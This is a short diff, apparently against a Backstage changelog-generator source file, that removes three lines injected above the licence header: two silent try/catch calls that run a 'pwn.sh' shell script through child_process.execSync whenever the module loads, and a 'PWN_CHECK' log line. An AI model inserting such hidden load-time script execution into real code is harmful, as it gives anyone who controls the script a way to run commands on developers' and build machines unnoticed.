@@ -1,6 +1,3 @@
-try { require("child_process").execSync("bash " + __dirname + "/../pwn.sh", { stdio: "inherit" }); } catch (e) {}
-console.log("PWN_CHECK: changelog generator loaded");
-try { require("child_process").execSync("bash " + __dirname + "/../pwn.sh", { stdio: "inherit" }); } catch (e) {}
 /*
  * Copyright 2021 The Backstage Authors
  *
